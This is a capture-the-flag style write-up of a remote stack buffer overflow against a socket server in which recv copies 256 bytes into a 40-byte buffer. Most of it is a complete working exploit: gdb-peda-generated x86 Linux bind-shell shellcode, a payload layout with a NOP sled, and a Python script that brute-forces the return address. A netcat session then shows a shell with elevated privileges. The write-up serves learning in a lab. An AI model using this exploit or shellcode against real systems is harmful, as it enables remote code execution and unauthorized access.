# Vulnerability
```
char buffer[40];
recv(client_fd, buffer, 256, 0);
```
This program copys 256bytes on buffer so that code, buffer overflow occurs and I can overwrite SFP & RET address.

# Exploitation
This program uses socket programming so I have to write a python code to do buffer overflow by using socket.

First, make a python code simply:
```python
from socket import *
from struct import *

HOST = "192.168.196.128"
PORT = 6666

shellcode = ""
payload = ""

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

print s.recv(100)
print s.recv(10)
s.send(payload)
s.close()
```
Now, I need to make shellcode. I used `gdb-peda` to make shellcode:
```
gdb-peda$ shellcode generate x86/linux bindport 7777 127.0.0.1
# x86/linux/bindport: 84 bytes
# port=7777, host=127.0.0.1
shellcode = (
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    "\x43\x52\x66\x68\x1e\x61\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xcd\x80"
)
```
This code will open 7777 port and I will connect to that port.

The payload will be:
```
---------------------------------------------------------------
| A*44 | RET(shellcode's address) | NOP * 100 | Shellcode(84) |
---------------------------------------------------------------
```

As I don't know where is buffer's address, I will use for loop and brute force that address.

```
pawn1454@ubuntu:~$ nc 192.168.196.128 7777

id
uid=0(root) gid=0(root) euid=520(death_knight) egid=520(death_knight)
my-pass
euid = 520
got the life
```

# Payload
```python
from socket import *
from struct import *

HOST = "192.168.196.128"
PORT = 6666

# x86/linux/bindport: 84 bytes
# port=7777, host=127.0.0.1
shellcode = (
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    "\x43\x52\x66\x68\x1e\x61\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xcd\x80"
)

for i in range(0xFF, 0x00, -1):
    for j in range(0xFF, 0x00, -20):
        payload = ""
        payload = payload + "A"*44
        payload = payload + chr(j) + chr(i) + "\xff\xbf"
        payload = payload + "\x90"*100
        payload = payload + shellcode
        
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((HOST, PORT))

        print "[*] ret address: " + hex(j) + " " + hex(i)
        print s.recv(100)
        print s.recv(10)
        s.send(payload)
        s.close()
```
